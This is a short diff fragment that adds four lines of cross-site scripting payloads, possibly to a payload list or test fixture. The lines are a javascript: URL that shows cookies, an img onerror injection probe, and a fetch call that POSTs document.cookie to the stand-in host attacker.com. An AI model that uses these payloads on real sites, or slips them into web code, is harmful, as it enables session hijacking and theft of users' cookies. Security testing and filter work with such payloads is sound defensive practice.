@@ -1,0 +1,4 @@
+javascript:alert(document.cookie)
+console.log(document.cookie)
+document.write('<img src=x onerror=alert(1)>')
+fetch('http://attacker.com', {method: 'POST', body:document.cookie})
